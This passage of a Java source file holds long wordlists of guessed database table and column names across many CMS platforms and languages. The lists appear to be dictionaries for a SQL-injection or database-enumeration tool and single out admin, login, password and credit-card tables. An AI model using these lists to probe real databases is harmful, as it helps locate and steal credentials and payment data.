ge#dtb_products_class#subscribe#page_restrictions#querycache_info#cdv_map_feature#oidtest#Link_table#guava_users#connectormacassocs#moduleexecs#guava_groups#Institution#sconfig#shared_secret_identity#platforms#BORROWER#phpbb_acl_options#markers#Population#shipping#guava_preferences#rating#UserCapability#Priority#rec_jobs#ezin_sections#Descriptions_Regions#SPACE#geo_Sea#DATA_ORG#Contributor#flag#jos_vm_product_download#jos_vm_coupons#jos_vm_product_reviews#jos_core_acl_aro#jos_vm_shopper_vendor_xref#jos_stats_agents#jos_vm_orders#jos_poll_menu#jos_content_rating#jos_vm_vendor#jos_vm_product_mf_xref#jos_vm_export#jos_polls#jos_content_frontpage#jos_vm_userfield_values#jos_categories#jos_poll_data#jos_vm_manufacturer#jos_vm_order_user_info#jos_core_acl_groups_aro_map#jos_messages#jos_vm_zone_shipping#jos_bannertrack#jos_vm_order_status#jos_modules_menu#jos_vm_product_type#jos_vm_product_type_parameter#jos_vm_tax_rate#jos_core_log_items#jos_modules#jos_users#jos_vm_product_category_xref#jos_vm_product_attribute#jos_poll_date#jos_vm_vendor_category#jos_vm_state#jos_vm_country#jos_weblinks#jos_vm_cart#jos_vm_shipping_label#jos_vm_manufacturer_category#jos_vm_shopper_group#jos_vm_product_votes#jos_vm_currency#jos_vm_creditcard#jos_menu#jos_groups#jos_messages_cfg#jos_vm_order_payment#jos_content#jos_bannerclient#jos_vm_product_discount#jos_core_log_searches#jos_vm_auth_user_group#jos_contact_details#jos_vm_auth_group#jos_vm_waiting_list#jos_vm_category_xref#jos_newsfeeds#jos_vm_auth_user_vendor#jos_vm_user_info#jos_vm_function#jos_vm_product_files#jos_vm_userfield#jos_vm_shipping_carrier#jos_core_acl_aro_map#jos_vm_shipping_rate#jos_vm_product#jos_vm_product_product_type_xref#jos_core_acl_aro_groups#jos_templates_menu#jos_menu_types#jos_plugins#jos_session#jos_vm_order_item#jos_vm_module#jos_vm_product_attribute_sku#jos_vm_product_price#jos_vm_csv#jos_migration_backlinks#jos_vm_product_relations#jos_core_acl_aro_sections#jos_vm_order_history#jos_banner#php_users#ALL_USERS#banned_users#users_tmp#users_club#publicusers#cmsusers#blacklist#cost#moves#pelates#tamio#tameio#xristes#zones#tamio_pelates#kwdikos#addressbookgrp#sendmsgs#publicationauthor#publicationfile#topicpublication#userrights#comp_group#computers_ID#event_log#networking#routing#software_licenses#ips#arxeia#SMS_TABLE#TABLE_PRIVILEGE_MAP#AMUSER#CONTACTTYPE#CONTENT#DOWNLOADGROUP#DOWNLOADS#DOWNLOADTYPE#EMAIL#ENQUIRY#FACTSHEET#FUND#FUNDGROUP#HISTORY#MANAGEMENTGROUP#SUBSCRIBE#TBLUSERS#TBLLIST#TBLLOG#TBLPROFILES#TBLREPORTS#TBLTRANSACTIONS#TBLRETAILUSERS#TBLCORPUSERS#TBLCORPORATEUSERS#tbladmins#sort#_wfspro_admin#4images_users#a_admin#adm#admin_login#admin_user#admin_userinfo#administer#administrable#administrate#administration#administrator#administrators#adminrights#adminuser#art#article_admin#articles#artikel#aut#autore#backend#backend_users#backenduser#bbs#chat_config#chat_messages#chat_users#clubconfig#content#cpg_config#cpg132_users#customers_basket#dbadmins#dealer#dealers#diary#download#Dragon_users#e107_user#fusion_user_groups#fusion_users#ibf_admin_sessions#ibf_conf_settings#ibf_members#ibf_members_converge#ibf_sessions#icq#index#info#ipb_sessions#joomla_users#jos_blastchatc_users#jos_comprofiler_members#jos_joomblog_users#jos_moschat_users#knews_lostpass#korisnik#korisnici#kpro_adminlogs#kpro_user#login_admin#login_admins#login_user#login_users#logins#logon#logs#lost_pass#lost_passwords#lostpass#lostpasswords#m_admin#main#mambo_session#mambo_users#manage#manager#mb_users#member#memberlist#minibbtable_users#mitglieder#movie#mybb_users#mysql#name#names#news_lostpass#newsletter#nuke_authors#nuke_bbconfig#nuke_config#nuke_popsettings#nuke_users#obb_profiles#parol#partners#passes#password#perdorues#perdoruesit#phorum_session#phorum_user#phorum_users#phpads_clients#phpads_config#forum_users#poll_user#punbb_users#pwd#pwds#reg_user#reg_users#registered#reguser#regusers#cards#site_login#site_logins#sitelogin#sitelogins#sites#smallnuke_members#smf_members#SS_orders#statistics#superuser#sysadmin#sysadmins#sysuser#sysusers#table#tables#tb_admin#tb_administrator#tb_login#tb_member#tb_members#tb_user#tb_username#tb_usernames#tb_users#tbl#tbl_user#tbl_users#tbluser#tbl_client#tblclients#tblclient#usebb_members#user_admin#user_info#user_list#user_login#user_logins#user_names#usercontrol#userinfo#userlogins#username#usernames#vb_user#vbulletin_session#vbulletin_user#voodoo_members#webadmin#webadmins#webmaster#webmasters#webuser#webusers#x_admin#xar_roles#xoops_bannerclient#xoops_users#yabb_settings#yabbse_settings#ACT_INFO#ActiveDataFeed#CategoryGroup#ChicksPass#ClickTrack#CountryCodes1#CustomNav#DataFeedPerformance1#DataFeedPerformance2#DataFeedPerformance2_incoming#DataFeedShowtag1#DataFeedShowtag2#DataFeedShowtag2_incoming#dtproperties#Event#Event_backup#Event_Category#EventRedirect#Events_new#Genre#JamPass#MyTicketek#MyTicketekArchive#News#Passwords by usage count#PerfPassword#PerfPasswordAllSelected#Promotion#ProxyDataFeedPerformance#ProxyDataFeedShowtag#ProxyPriceInfo#Region#SearchOptions#Series#Sheldonshows#StateList#States#SubCategory#Subjects#Survey#SurveyAnswer#SurveyAnswerOpen#SurveyQuestion#SurveyRespondent#sysconstraints#syssegments#tblRestrictedPasswords#tblRestrictedShows#Ticket System Acc Numbers#TimeDiff#Titles#ToPacmail1#ToPacmail2#Total Members#UserPreferences#uvw_Category#uvw_Pref#uvw_Preferences#Venue#venues#VenuesNew#X_3945#stone list#tblArtistCategory#tblArtists#tblConfigs#tblLayouts#tblLogBookAuthor#tblLogBookEntry#tblLogBookImages#tblLogBookImport#tblLogBookUser#tblMails#tblNewCategory#tblNews#tblOrders#tblStoneCategory#tblStones#tblUser#tblWishList#VIEW1#viewLogBookEntry#viewStoneArtist#vwListAllAvailable#CC_info#CC_username#cms_user#cms_users#cms_admin#cms_admins#user_name#jos_user#table_user#mail#bulletin#cc_info#login_name#admuserinfo#userlistuser_list#SiteLogin#Site_Login#UserAdmin#Admins#Login#Logins#account#accnts#accnt#user_id#members#usrs#usr2#accounts#admin#admins#adminlogin#auth#authenticate#authentication#account#access#customers#customer#config#conf#cfg#hash#login#logout#loginout#log#member#memberid#password#pass_hash#pass#passwd#passw#pword#pwrd#pwd#store#store1#store2#store3#store4#setting#username#name#user#user_name#user_username#uname#user_uname#usern#user_usern#un#user_un#usrnm#user_usrnm#usr#usernm#user_usernm#user_nm#user_password#userpass#user_pass#user_pword#user_passw#user_pwrd#user_pwd#user_passwd#wsop#Admin#Config#Settings#tbl_admin#tbl_admins#tbl_member#tbl_members#tblservers#id#uid#userid#user_id#auid#adminpass#LoginID#FirstName#LastName#cms_member#cms_members#Webmaster#Webuser#tbl_tbadmin#Adminlogin#useraccount#nguoidung#quanly#quantri#dangnhap#taikhoan#taikhoanquantri#useraccounts#nguoidungs#tbuser#tblogin#tbadmin#tbaccount#tbuseraccount#tbnguoidung#tbllogin#tbladmin#tblaccount#tbluseraccount#tblnguoidung#tbusers#tblogins#tbadmins#tbaccounts#tbuseraccounts#tbnguoidungs#tbllogins#tblaccounts#tbluseraccounts#tblnguoidungs#tb_account#tb_useraccount#tb_nguoidung#tbl_login#tbl_account#tbl_useraccount#tbl_nguoidung#tb_logins#tb_accounts#tb_useraccounts#tb_nguoidungs#tbl_logins#tbl_accounts#tbl_useraccounts#tbl_nguoidungs#tb_admins#adminid#admin_id#adminuserid#admin_userid#AdminUID#adminusername#admin_username#adminname#admin_name#usr#usr_n#usrname#usr_name#usrnam#useradmin#apwd#adminpaw#adminpwd#admin_pwd#admin_pass#adminpassword#admin_password#admin_passwords#usrpass#usr_pass#pass#userpass#user_pass#dbaccount#dbstudent#dbstudents#dbadmin#useres#dbuser#dbusers#personal#dbpersoon#list#lists#dblist#userpassword#user_password#userpwd#user_pwd#SecurityLevel#LastLoginDate#LoginIP#pword#ad#Konto#Konten#admin_psw#verwalten#verwaltet#administrieren#Verwaltung#Administratoren#adminpsw#adminupass#Kunst#Artikel#Autor#Buch#chat#Kunden#tblnews#banner#options#general#upload#uploads#file#akhbar#sb_host_admin#Firma#contenu#Kontakt#Kontakte#Inhalt#Kontrolle#controle#Kunde#Tagebuch#herunterladen#dw#glmm#gly#us#stnuser#stuser#stusers#stuseres#dbstaff#db_staff#staff_db#database#databases#test_user#user_test#test_users#users_test#Gruppe#Gruppen#guanli#guanliyuan#h_admin#Bilder#Mitgliederbereich#key#keywords#Anmeldung#Protokolle#Mitglied#Mitgliederliste#Mitglieder#mima#mm#mpassword#musername#Film#Filme#nc#new#Namen#Auftrag#Bestellungen#Passwort#power#psw#pswd#pw#pwd1#jhu#webapps#ASP#Microsoft#sing#singup#singin#registeration#reg#registriert#root#roots#Tagung#Sitzungen#Einstellungen#Standorte#Statistiken#sys#Systemadministratoren#systime#Tisch#Tabellen#Titel#u#u_n#u_name#u_p#u_pass#Benutzer#user_pw#Benutzerliste#userpasswd#usr_pw#usrs#Benutzername#Benutzernamen#vip#Webbenutzer#sb_host_adminActiveDataFeed#Kategorie#Land#Suchoptionen#Serie#Staaten#UnterkKlasse#Umfrage#TotalMembers#Veranstaltungsort#Veranstaltungsorte#Ansicht1#utilisateur#trier#compte#comptes#administrer#administrables#administrateur#administrateurs#auteur#livre#entreprise#concessionnaire#concessionnaires#telecharger#groupe#groupes#liens#connexion#principal#gestionnaire#membre#membres#films#nom#noms#ordre#commandes#partenaire#partenaires#passe#asse#enregistrs#paramtres#statistiques#super#tester#utilisateurs#intranet_users#utlisateur#Catogorie#Pays#Sujets#Sondage#Titres#Lieux#Affichage1Affichage1edu#win#pc#windows#mac#edu#bayviewpath#bayview#server#slserver#ColdFusion8#ColdFusion#Cold#Fusion8#Fusion#ststaff#sb_host_adminAffichage1#Affichage1#yhm#yhmm#Affichage1name#sb_host_adminAffichage1name#TypesTab#utenti#categorie#attivita#comuni#discipline#Clienti#gws_news#SGA_XPLAN_TPL_V$SQL_PLAN#emu_services#nlconfig#oil_bfsurvey_pro#oil_users#oil_menu_types#oil_polls#Accounts#oil_core_log_searches#SGA_XPLAN_TPL_V$SQL_PLAN_SALL#oil_phocadownload_categories#gws_page#oil_bfsurveypro_choices#oil_poll_data#oil_poll_date#argomento#oil_modules#ruolo#oil_contact_details#emu_profiles#user_connection#oil_poll_menu#jos_jf_tableinfo#oil_templates_menu#oil_messages_cfg#oil_biolmed_entity_types#oil_phocagallery_votes#oil_core_acl_aro#regioni#oil_modules_menu#dati#gws_admin#oil_phocagallery_user_category#articoli#oil_content_frontpage#cron_send#oil_biolmed_measures#comune#SGA_XPLAN_TPL_DBA_TABLES#esame#oil_session#oil_phocadownload_licenses#oil_weblinks#oil_messages#oil_phocagallery_votes_statistics#dcerpcbinds#oil_jf_content#SGA_XPLAN_TPL_DBA_CONS_COLUMNS#SGA_XPLAN_TPL_DBA_IND_COLUMNS#gruppi#Articoli#gws_banner#gws_category#soraldo_ele_tipo#db_version#SGA_XPLAN_TPL_DBA_TAB_COLS#oil_biolmed_thesis#jos_languages#mlmail#SGA_XPLAN_TPL_V$SQLTEXT_NL#oil_bannertrack#oil_core_log_items#oil_rokversions#oil_bfsurveypro_34#oil_bfsurveypro_35#oil_google_destinations#gws_product#oil_jf_tableinfo#oil_phocadownload#oil_biolmed_blocks#oil_bfsurvey_pro_example#oil_bfsurvey_pro_categories#oil_bannerclient#oil_core_acl_aro_sections#SGA_XPLAN_TPL_V$SQL#oil_biolmed_land#connections#not_sent_mails#sga_xplan_test#oil_languages#utente#documento#gws_purchase#oil_plugins#oil_phocagallery#oil_menu#oil_biolmed_measures_by_entity_types#offers#anagrafica#gws_text#oil_groups#oil_content_rating#sent_mails#oil_banner#oil_google#gws_jobs#eventi#mlattach#oil_migration_backlinks#oil_phocagallery_categories#downloads#mlgroup#oil_sections#decodifica_tabelle#oil_phocagallery_img_votes#oil_phocagallery_img_votes_statistics#oil_dbcache#oil_content#p0fs#oil_biolmed_entity#oil_rokdownloads#oil_core_acl_groups_aro_map#gws_client#decodifica_campi#oil_phocagallery_comments#oil_categories#oil_newsfeeds#oil_biolmed_measurements#oil_phocadownload_user_stat#oil_core_acl_aro_groups#SGA_XPLAN_TPL_V$SQL_PLAN_STAT#oil_core_acl_aro_map#dcerpcrequests#oil_phocadownload_sections#oil_components#discipline_utenti#jos_jf_content#oil_phocadownload_settings#SGA_XPLAN_TPL_DBA_CONSTRAINTS#oil_biolmed_technician#oil_stats_agents#SGA_XPLAN_TPL_DBA_INDEXES#Avion#departement#Compagnie#produits#spip_auteurs#BDDJoueurs_alliance#spip_articles#spip_syndic#pays#spip_auteurs_rubriques#spip_mots_forum#spip_signatures#diplomatie#spip_mots_breves#spip_forum#spip_auteurs_messages#spip_documents#spip_messages#spip_index_dico#spip_meta#spip_petitions#spip_mots_syndic#spip_types_documents#etudiant#spip_groupes_mots#spip_documents_articles#spip_rubriques#spip_breves#agenda#BDDJoueurs_colonies#spip_mots_articles#spip_mots#spip_syndic_articles#spip_auteurs_articles#spip_mots_rubriques#BDDJoueurs#modulephoto#nuke_cities#forums#nuke_banner_positions#nuke_subscriptions#nuke_downloads_categories#nuke_journal_comments#nuke_bbranks#spip_documents_rubriques#nuke_confirm#service#nuke_bbthemes_name#nuke_autonews#nuke_bbdisallow#nuke_reviews_add#EDITEUR#nuke_links_newlink#nuke_faqcategories#etudiants#nuke_stats_year#nuke_bbsmilies#spip_mots_documents#spip_documents_breves#nuke_bbsearch_results#post#nuke_users_temp#nuke_blocks#nuke_reviews_main#themes#nuke_modules#nuke_banner_plans#nuke_links_votedata#spip_referers#inscription#BONUS#nuke_links_editorials#nuke_topics#nuke_bbprivmsgs_text#chatbox#nuke_referer#nuke_bbauth_access#nuke_journal_stats#nuke_faqanswer#nuke_banner_terms#message#nuke_bbvote_voters#nuke_pages_categories#spip_index#modulerubriquephoto#spip_visites#Role#nuke_public_messages#actualites#nuke_reviews_comments#nuke_downloads_votedata#nuke_headlines#nuke_downloads_editorials#enseignant#modulemessage#nuke_session#nuke_queue#nuke_main#nuke_bbposts#spip_ortho_cache#Enseignant#nuke_downloads_newdownload#sons#plurielanim#nuke_bbforums#nuke_bbsearch_wordmatch#nuke_bbvote_results#nuke_stats_date#nuke_bbwords#nuke_bbcategories#typecompte#nuke_stories#nuke_stats_month#personne#etablissement#nuke_counter#indexation#nuke_poll_desc#nuke_links_links#nuke_bbtopics#Utilisateurs#nuke_related#nuke_downloads_downloads#spip_versions_fragments#nuke_bbgroups#nuke_bbtopics_watch#nuke_bbuser_group#nuke_downloads_modrequest#spip_versions#Joueur#nuke_bbsessions#nuke_links_categories#directeur#Etudiant#nuke_bbposts_text#nuked_page#Personne#nuke_bbbanlist#Parametre#nuke_pollcomments#nuke_bbforum_prune#nuke_pages#nuke_links_modrequest#nuke_stats_hour#nuke_groups_points#nuke_reviews#nuke_bbthemes#modulemailling#agence#nuke_encyclopedia#nuke_bbsearch_wordlist#nuke_message#Equipe#nuke_comments#nuke_poll_check#nuke_journal#nuke_stories_cat#nuke_banner#nuke_groups#spip_visites_articles#nuke_encyclopedia_text#spip_referers_articles#nuke_bbvote_desc#Artiste#nuke_poll_data#nuke_bbprivmsgs#spip_ortho_dico#spip_caches#guestbook#binn_forum_settings#binn_forms_templ#binn_catprops#currency#binn_imagelib#binn_news#phpshop_opros_categories#binn_articles_messages#binn_cache#binn_bann_temps#binn_forum_threads#voting#binn_update#terms#binn_site_users_rights#binn_vote_options#binn_texts#binn_forum_temps#binn_order_temps#binn_basket#binn_order#binn_system_log#binn_vote_results#binn_articles#phpshop_categories#binn_maillist_temps#binn_system_messages#binn_articles_temps#binn_search_temps#banners#binn_imagelib_templ#binn_faq#binn_bann#phpshop_news#binn_menu_templ#binn_maillist_settings#binn_docs_temps#binn_bann_restricted#phpshop_system#binn_calendar_temps#binn_forum_posts#binn_cform_settings#phpshop_baners#phpshop_menu#binn_forms_fields#binn_cform_list#binn_vote#phpshop_links#mapdata#binn_submit_timeout#binn_forum_themes_temps#binn_order_elems#binn_templates#binn_cform#binn_catalog_template#binn_ct_templ_elems#binn_template_elems#binn_rubrikator_tlevel#binn_settings#binn_pages#binn_users#binn_categs#binn_page_elems#binn_site_users_temps#binn_vote_temps#binn_rubrikator_temps#binn_faq_temps#binn_sprav#setup_#binn_basket_templ#binn_forum_maillist#binn_news_temps#phpshop_users#binn_catlinks#binn_sprav_temps#binn_maillist_sent#binn_forms_templ_elems#jubjub_errors#binn_maillist#binn_catrights#binn_docs#binn_bann_pages#binn_ct_templ#binn_menu#binn_user_rights#binn_cform_textarea#binn_catalog_fields#vykachka#binn_menu_tlevel#phpshop_opros#binn_form39#binn_site_users#binn_path_temps#order_item#tt_content#kunde#medien#Mitarbeiter#fe_users#dwp_wetter#dwp_popup#voraussetzen#dwp_foto_pictures#dwp_karte_speisen#dwp_news_kat#dwp_structur#dwp_foto_album#dwp_karte_kat#bestellung#dwp_content#be_users#Vorlesungen#dwp_content_pic#dwp_link_entries#dwp_ecard_album#persons#dwp_buchung_hotel#dwp_link_kat#dwp_news_absatz#Assistenten#Professoren#Studenten#dwp_ecard_pictures#lieferant#dwp_bewertung#mitarbeiter#gruppe#dwp_news_head#wp_post2cat#phpbb_forum_prune#crops#mein_doc#artikel_kategorie#kategorien#rel_person_paper#tx_tcdirectmail_bounceaccount#Akten#skins#riddles#ci_slogans#phpbb_vote_voters#account_map_event#roles#stellen#meetings#special_category#rel_paper_topic#kbase_category#attribut#phpbb_auth_access#zo_gruppe_stelle#zo_kontakt_stelle#hoeren#shop_settings#tutorial#motd_coding#artikel_variationsgruppen#dwp_kontakt#papers#gesuche#zahlung_weitere#ts2_server_privileges#artikel_variationen#artikel_optionen#chessgames#portale#products_images#phpbb_privmsgs_text#kurs#KUNDE#wp_linkcategories#tx_tcdirectmail_targets#tx_templavoila_datastructure#Adresse#bestellung_kunde#rel_person_topic#css_file#visual#account_multi#Adressen#phpbb_words#phpbb_disallow#kauf_artikel#music_association#phpbb_banlist#dokumente#greylist#backup#map_event#kreditkarte#house_extensions#address_book#crops_tpl#phpbb_vote_desc#versandkostenpreise#pruefen#gruppen#vertreter#phpbb_confirm#verkaeufer#be_groups#rel_person_organization#phpbb_privmsgs#buecher#kategorie#phpbb_sessions#phpbb_search_results#studierende#user_online_newyear#hersteller#object_link#adresse#address_format#newsletter_recipients#PERMISSIONS#user_uploads_pictures#festplatte#veranstalter#mein_doc_h#tx_tcdirectmail_clicklinks#phpbb_vote_results#phpbb_topics_watch#tx_tcdirectmail_lock#account_map#standort#gd#delete_reasons#tx_tcdirectmail_sentlog#valhalla#vis_typen#counter#kbase_main#music_items#kauf#payment_qenta#seite_abschnitt#trivia#mehrwertsteuer#massenmail#klassen#hilfe#geraet#tt_address#dg_books#portal_access#orders_recalculate#artikel_bestellung#kontakt#chesshistory#notizen#seite_layout#virgator_table#wp_categories#chessmessages#endereco#pessoa#usuarios#estado#pedidos#CLIENTE#itens#telefone#empresa#PRODUTO#categoria#cidades#clientes#produtos#municipio#cliente#LT_PROCEDIMENTO#calendario#D_US_FAVORITOS#moradia#pessoa_telefone#contador#aidf#resumo#add_irm#M_ESQUEMA_PERMISSAO#duvida#LT_METODO_ATUALIZACAO#M_RELATORIOS#LT_SERIE#estados#LT_OBJETO#cidade#declaracaonf#especieaidf#S_SESSOES#D_PR_HONORARIOS#empresa_atividade#correcaostrategy#jos_docman_groups#D_US_RECENTE#notafiscal#solicitacao#pessoa_endereco#atividade#M_FATURAS#D_PR_APENSOS#agencia#LT_LANCAMENTO#D_US_AREA_DE_TRABALHO#D_FA_ITENS#dist_universidade#multastrategy_faixamulta#LT_TIPO_DE_ACAO#D_PR_EVENTOS#D_FA_PARCELAS#tipodeducao#D_PR_PARCELAMENTO#sala#D_US_EQUIPES_DO_USUARIO#cidadao#documentos#S_GLOBAL#M_CADASTRO_GERAL#jos_docman_licenses#guiaavulsa#solicitacaosenha#M_CUBOS#promocoes#grau_escolaridade#imagens#multastrategy#D_PR_PARTES#processo#gestor#imagem#categorias#LT_CLASSE_FORO#jurosstrategy#deducao#S_PARAMETROS#notafiscal_deducao#CAIXA#foto#M_FERIADOS#S_ORIGENS#guiaavulsa_itemguiaavulsa#situacaoitem#notafiscal_itemnotafiscal#cotacao#papel#M_EMAIL_FILA#D_PR_OBJETOS#dados_prefeitura#S_LOG#LT_FASE#D_PR_ADVOGADOS#M_USUARIO#projeto#LT_SITUACAO#D_PR_CUSTAS#grupoatividade#LT_NATUREZA#membros_familia#instituicao#emprestimos#itemguiaavulsa#D_EM_DESTINATARIO#LT_GRUPO#S_SEQUENCIAS#itemnotafiscal#disciplina#jos_docman#autorizacaonfe#tipo_bolsa#estoque#LT_JURISDICAO#serie#sse_estudante#LT_FOROS#perfil#despesa_familia#noticias#LT_GARANTIA#M_ESQUEMA_HORARIO#MM_NOTIFICACOES_DO_PROCESSO#jos_jce_plugins#grau_parentesco#D_PR_GARANTIAS#M_SERVICOS_PRESTADOS#LT_CATEGORIA#faixamulta#encerramento#M_PROCESSOS#dados_familia#MM_USUARIOS_DO_PROCESSO#LT_ENCERRAMENTO#LT_DECISAO#indice#contador_empresa#sse_familia#D_SE_INDICES#cursos#estado_civil#dados_estudante#LT_EQUIPES#LT_PROGNOSTICO#LT_EVENTO#jos_jce_groups#D_PR_DOCUMENTOS#D_PR_DESDOBRAMENTOS#logradouro#despesa_aluno#fiscal#LT_CUSTOM4#convite#manutencao#LT_CUSTOM1#LT_CUSTOM2#LT_CUSTOM3#jos_respuestas#DEPARTAMENTO#EMPLEADO#TRABAJA_EN#DEPENDIENTE#LOCALIZACIONES_DEPT#PROYECTO#lineas_fac#pueblos#NUEVOS#CENTROS#BANCOS#PERSONAL#SUCURSALES#PRODUCTOS#provincias#jos_estadisticas#USUARIO#ALUM#MOVIMIENTOS#ACTOR#nuke_gallery_rate_check#ANTIGUOS#CUENTAS#vendedores#CLIENTES#articulos#DEPARTAMENTOS#PROFESORES#jos_preguntas#PEDIDOS#EMPLEADOS#nuke_gallery_pictures_newpicture#Books#grupo#facturas#aclaraciones#preguntas#personas#estadisticas#url#cdb_adminactions#BlockInfo#cdb_attachtypes#cdb_attachments#mymps_lifebox#cdb_buddys#mymps_payapi#LastDate#cdb_medals#mymps_payrecord#cdb_forumlinks#cdb_adminnotes#cdb_admingroups#cdb_creditslog#stkWeight#mymps_checkanswer#cdb_announcements#cdb_bbcodes#cdb_advertisements#cdb_memberfields#mymps_telephone#cdb_forums#cdb_forumfields#cdb_favorites#cdb_banned#cdb_crons#cdb_access#cdb_invites#sysmergeschemaarticles#CodeRuleType#cdb_membermagics#cdb_imagetypes#cdb_memberspaces#cdb_campaigns#pw_wordfb#cdb_paymentlog#cdb_adminsessions#pw_adminset#seen#t_snap#MSmerge_altsyncpartners#zl_deeds#pw_styles#pw_announce#cdb_pluginvars#pw_smiles#cdb_modworks#ncat#mymps_member_tpl#pw_threads#zl_admin#cdb_onlinetime#cdb_mythreads#cdb_members#spt_datatype_info#mymps_certification#mymps_badwords#seentype#mymps_cache#zl_article#spt_datatype_info_ext#cdb_debateposts#mymps_corp#mymps_member_album#mgbliuyan#pw_schcache#zl_finance#pw_banuser#mymps_news#cdb_pluginhooks#mymps_member_docutype#wp1_categories#cdb_magicmarket#MSmerge_errorlineage#cdb_activities#zl_baoming#cdb_orders#ad_ad#cdb_pms#cdb_magics#cdb_itempool#phpcms_announce#pw_actions#pw_msg#mymps_news_img#cdb_debates#cdb_magiclog#pw_forums#mymps_channel#cdb_polls#t_stat#pw_attachs#cdb_plugins#pw_membercredit#cdb_posts#mymps_member_category#cdb_activityapplies#zl_media#acctmanager#pw_usergroups#cdb_faqs#cdb_onlinelist#pw_hack#mymps_member_comment#Market#mymps_config#mymps_mail_template#mymps_advertisement#MSrepl_identity_range#pw_favors#mymps_crons#pw_config#pw_credits#cdb_failedlogins#mymps_member_docu#pw_posts#cdb_attachpaymentlog#cdb_myposts#cdb_polloptions#wp1_comments#cdb_caches#pw_members#mymps_upload#spt_provider_types#pw_sharelinks#pw_tmsgs#pw_polls#cdb_moderators#pw_bbsinfo#aliasregex#userfiles#acctmanager2#cdb_pmsearchindex#mymps_news_focus#cdb_forumrecommend#publishers#zl_advertisement#guanggaotp#pw_memberinfo#aliastype#mymps_mail_sendlist#mymps_navurl#kullanici#kullanicilar#yonetici#yoneticiler#adres#adresler#yayincilar#yayinci#urun#urunler#kategori#kategoriler#ulke#ulkeler#siparis#siparisler#bayi#bayiler#stok#reklam#reklamlar#site#siteler#sayfa#sayfalar#icerik#icerikler#yazi#yazilar#genel#istatistik#istatistikler#duyuru#duyurular#haber#haberler#komisyon#ucret#ucretler#bilgi#basvuru#basvurular#kontak#kontaklar#adminstbl#admintbl#affiliateUsers#hsa_user#tblmanager#tblmanagers#tblproduct#tblproducts#tuser#tusers#userstbl#usertbl#user_data#accounts#admin#baza_site#benutzer#category#comments#company#credentials#Customer#customers#data#details#dhruv_users#dt_tb#employees#events#forsale#friends#giorni#images#info#items#kontabankowe#login#logs#markers#members#messages#orders#order_table#photos#player#players#points#register#reports#rooms#shells#signup#songs#student#students#table#table2#tbl_images#tblproduct#testv2#tickets#topicinfo#trabajo#user#user_auth#userinfo#user_info#userregister#users#usuarios#utenti#wm_products#wp_payout_history#zamowienia#wp_blogmeta#wp_blogs#wp_blog_versions#wp_commentmeta#wp_comments#wp_links#wp_options#wp_postmeta#wp_posts#wp_registration_log#wp_signups#wp_site#wp_sitemeta#wp_termmeta#wp_term_relationships#wp_terms#wp_term_taxonomy#wp_usermeta#wp_users#assets#bannerclient#banner#bannertrack#categories#components#contact_details#content_frontpage#content_rating#content#core_acl_aro_groups#core_acl_aro_map#core_acl_aro_sections#core_acl_aro#core_acl_groups_aro_map#core_log_items#core_log_searches#extensions#groups#languages#menu#menu_types#messages_cfg#messages#migration_backlinks#modules_menu#modules#newsfeeds#plugins#poll_data#poll_date#poll_menu#polls#redirect_links#Schemas#sections#session#stats_agents#templates_menu#template_styles#update_categories#update_sites_extensions#update_sites#updates#usergroups#user_profiles#users#user_usergroup_map#viewlevels#weblinks#";
        data = data.replace("#","\n");
        return data;
    }

    //数据库字段
    private String sql_columns(){
        String data = "id#name#user_id#description#username#type#title#userid#group_id#first_name#itemid#category_id#firstname#code#pno#nextval#hostid#table_name#cid#email#smtp_helo#platformid#dept_id#album_id#key_#the#child_cfg#jid#platform#expression#functionid#smtp_server#uid#clock#alarmid#alertid#private_key#actionid#triggerid#triggertemplateid#local_spi#delay#sid#mediaid#peer_cfg#smtp_email#order_id#shared_secret#itemtemplateid#certificate#insertid#role_id#song_id#item_id#product_id#blob_id#distip#artist_id#empno#customer_name#grade#branch_name#portal_id#deptno#data#rid#app_id#class#loan_number#countryid#enabled#fname#country#ename#object_id#idtype#groupid#rowid#accno#account_number#event#passwd#sequence_id#datarow#owner_id#display#pid#venue#locked#eno#serviceid#alias#categoryid#canoccupantsinvite#keyword#channel_id#loginrestrictedtonickname#registrationenabled#logenabled#ip#maxnumber#tag_id#alert_id#cananyonediscoverjid#address#sumdatarow#emp_id#ono#anyone#surname#subdomain#maxusers#ccc#datacol#os#status_id#node_id#essn#last_name#iteration#canchangenickname#canoccupantschangesubject#membersonly#created_by#succ_rate#dnumber#service_id#mid#publicroom#propvalue#empty_days#moderated#customer_id#wdatarow#persistent#authorid#patch_status_id#submitted_by#resolution_id#osvendor#routeid#arch#fid#assigned_to#ns#event_id#problem_code#city#note#channel#element_id#cat_id#position_id#schema_id#area#bug_category_id#session_id#project_id#random#nsprefix#archive_id#nsschema#view_id#pname#bug_group_id#lastname#link_id#langid#catname#bug_id#magic_string#m_id#zip#patch_category_id#custno#idcountry#stopid#identifier#category#isbn#group_project_id#extension_id#state#password#page#extension#spellid#dno#instanceof#network#priority#aname#person_id#ncbofile#student_number#term_id#uno#path_id#aid#location_id#propertyno#course_number#tid#langug_code#variable#dept_desc#orderno#ownerno#partof#clientno#white#macaddr#jobtypeid#direction#md5sum#orga_id#parentcategoryid#beginstateid#mname#qno#src#featurename#client_id#route_id#ticker#version#modulename#maty_id#currentstateid#userinfo_id#column_id#imageinfo_id#staffno#lid#metadatainfoid#context#app_title#dest#attributecategory_id#operation_type#dnum#pers_id_registerer#datasource#connectorid#our_loc#country_name#dname#capital#search_id#statechangeid#rightid#endstateid#distconnectorid#walnut#distmacaddr#pixsize#jobid#revid#match_cid#branchno#prepend_digits#stockno#ncbofileid#object_type#type_id#pubid#qagent#office#db_name#bank#dummy#storyname#col#petty#qname#store_id#inv_id#inventory#gift#cno#item#c_sec_id#row_id#price#loc_id#ssn#c_id#sname#parent#allowance#color#group_name#accounts#vendorid#gifi_accno#movie_id#rate#company#subid#commentpath#protocol_action_id#topic_id#s_id#config_id#long#link#copyright#vehicle#customerid#customer#f_id#chart_id#url#host#loans#charttype#imagefile#data_set_id#guest_ip#biosample_id#affiliation_id#os_id#street_id#book_code#object_name#start_date#form_id#itemno#provincial#confid#ratingid#drinker#qname_id#whatsdom#config_name#ship_id#investigator_id#smilies_id#cal_id#license_id#conf#contact_id#procedure_id#column_name#chromosome_id#tf_key#agent_specialtyid#users_id#gid#publisher_code#setting#format_id#word#slogan#superssn#product#referredby#operationid#ban_ip#p_id#lbl_aom_unaccessible_shipmethod#origin#comment_id#product_version#probe_id#orderdate#ordernumber#data_type_id#publisherid#lake_id#course_id#questionid#student_id#user_name#answerid#hashtag#preference_id#author_num#branch_num#derived_id#factoryid#filterid#log#pnumber#specialtyid#plugin_id#aa#file#dept_number#action_attribute_id#cpr#